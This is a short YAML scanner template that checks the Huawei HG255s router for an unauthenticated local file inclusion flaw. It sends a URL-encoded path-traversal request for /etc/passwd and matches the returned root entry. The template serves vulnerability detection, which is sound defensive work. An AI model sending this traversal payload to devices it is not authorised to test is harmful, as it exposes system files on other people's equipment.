id: huawei-hg255s-lfi
name: Huawei HG255s - Local File Inclusion
severity: high
confidence: tentative
description: Huawei HG255s is vulnerable to local file inclusion due to insufficient validation of the received HTTP requests.
  A remote attacker may access the local files on the device without authentication.
reference: CWE-22
tags:
- huawei
- lfi
- router
- vuln
requests:
- method: GET
  path: /css/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
